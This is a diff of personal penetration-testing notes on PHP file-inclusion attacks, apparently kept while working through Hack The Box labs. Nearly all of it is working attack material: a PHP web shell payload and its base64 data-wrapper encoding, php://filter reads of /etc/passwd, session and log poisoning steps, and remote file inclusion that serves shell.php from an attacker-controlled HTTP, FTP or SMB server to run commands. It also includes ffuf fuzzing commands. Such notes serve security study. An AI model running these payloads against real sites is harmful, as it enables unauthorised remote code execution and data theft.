@@ -8,6 +8,7 @@ To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apac
 allow_url_include = On
 ```
 
+[[php]]
 ##### PHP Wrappers
 * https://www.php.net/manual/en/wrappers.php.php
 * `php://filter/convert.base64-encode/resource=/etc/passwd`
@@ -22,14 +23,13 @@ allow_url_include = On
 ![[file links.png]]
 We will use the PHP code `<?php system($_GET['cmd']); echo 'Shell done!'; ?>` as our payload. The value of the payload, when encoded to base64, will be `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`
 
-
-
 ###### Session poisoning files
 1. Inject `<?php echo phpinfo(); ?>` into session.
 2. Access URL with LFI vulnerability to execute the code:
 `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]`
 
 ###### Log poisoning
+[[log poison]]
 ```php
 $ nc MACHINE_IP 80      
 <?php echo phpinfo(); ?>
@@ -59,7 +59,6 @@ https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
 
 
 ##### LFI
-
 `dataserver=file:///etc/passwd`
 
 #### RFI
@@ -74,8 +73,8 @@ allow_url_include = On
 or
 `try and include a URL`, and see if we can get its content
 
-RCE with RFI
-```
+RCE with RFI [[RCE]]
+```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 python3 -m http.server 8000
@@ -91,7 +90,7 @@ sudo python -m pyftpdlib -p 21
 curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
 ```
 
-host via smb
+host via smb [[SMB]]
 ```bash
 impacket-smbserver -smb2support share $(pwd)
 ```
@@ -100,9 +99,9 @@ open
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 
-RCE via file upload
-3. upload a php script (look File upload section)
-4. use LFI methos to  `?language=./uploads/shell.gif&cmd=id`
+RCE via file upload [[RCE]]
+1. upload a php script (look File upload section)
+2. use LFI methos to  `?language=./uploads/shell.gif&cmd=id`
 
 LFI fuzzing
 https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters
@@ -110,14 +109,14 @@ https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-
 https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
 https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt
 
-fuzzing server dirs
-```
-la1n23@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+fuzzing server dirs [[ffuf]]
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 
 fuzz logs and configs of server
 https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
-```
+```bash
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
 ```
 
